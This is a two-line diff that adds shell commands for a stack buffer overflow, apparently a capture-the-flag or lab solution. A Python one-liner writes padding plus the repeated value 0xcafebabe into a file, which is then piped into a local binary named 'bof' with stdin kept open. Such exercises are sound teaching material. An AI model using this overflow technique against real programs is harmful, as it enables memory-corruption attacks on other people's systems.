@@ -1,0 +1,2 @@
+python -c 'print "AAA" + "\xca\xbe\xba\xfe"*20 + "\n"' > tmp
+cat tmp - | ./bof
